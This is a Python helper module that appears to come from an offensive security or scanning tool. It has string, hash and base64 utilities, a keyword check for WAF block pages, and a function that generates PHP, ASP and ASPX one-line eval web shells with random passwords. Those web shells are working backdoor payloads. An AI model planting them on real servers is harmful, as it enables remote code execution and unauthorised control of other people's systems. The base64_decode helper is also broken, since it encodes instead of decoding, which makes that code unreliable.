import hashlib
import os
import re
import json
import base64 as b64
import random
import string
from flashtext import KeywordProcessor


def build_md5_str(source):
    """ 生成md5字符串 """
    return hashlib.md5(source.encode()).hexdigest()


MD5 = build_md5_str


def build_random_str(length=8):
    """ 生成随机字符串 """

    return ''.join(random.sample(string.ascii_letters, int(length)))


randomStr = build_random_str


def build_random_lower_str(length=8):
    """ 生成随机小写字符串 """

    return ''.join(random.sample(string.ascii_lowercase, int(length)))


randomLowercase = build_random_lower_str


def build_random_upper_str(length=8):
    """ 生成随机大写字符串 """

    return ''.join(random.sample(string.ascii_uppercase, int(length)))


randomUppercase = build_random_upper_str


def build_random_int(min_length=8, max_length=16):
    """ 生成随机整数 """

    return random.randint(int(min_length), int(max_length))


randomInt = build_random_int


def base64_encode(source):
    """ base64编码 """
    if isinstance(source, str):
        source = source.encode('utf-8')
    return b64.b64encode(source).decode()


base64Encode = base64_encode


def base64_decode(source):
    """ base64解码 """
    if isinstance(source, str):
        source = source.encode('utf-8')
    return b64.b64encode(source).decode()


base64Decode = base64_decode


def jsonp_to_json(jsonp_str):
    # jsonp转json

    return json.loads(re.match(".*?({.*}).*", jsonp_str, re.S).group(1))


def is_exist_waf(content):
    # 判断waf
    kp = KeywordProcessor()
    kp.add_keywords_from_list(
        [
            "安全拦截",
            "攻击行为",
            "安全威胁",
        ]
    )
    for keyword in kp.extract_keywords(content):
        return True
    return False


def string_split(value) -> list:
    result = []
    cut_list = str(value).split(',')
    for one_cut in cut_list:
        segment = one_cut.split('-')
        if len(segment) == 1:
            min_value = max_value = segment[0]
        else:
            min_value, max_value = segment
        for one in range(int(min_value), int(max_value) + 1):
            result.append(one)
    return result


def build_web_shell(lang='php') -> tuple:
    # 生成WebShell
    code, password = '', build_random_str(8)
    if lang == 'php':
        code = '<?php @eval($_POST["{}"]);?>'.format(password)
        flag = 'echo "<{}>";die();'.format(password)
    elif lang == 'asp':
        code = '<%eval request("{}")%>'.format(password)
        flag = 'Response.Write("{}")'.format(password)
    elif lang == 'aspx':
        code = '<%@ Page Language="Jscript"%><%eval(Request.Item["{}"],"unsafe");%>'.format(password)
        flag = 'Response.Write("{}")'.format(password)
    else:
        raise Exception(f'Unusable language {lang}')
    return code, password, flag
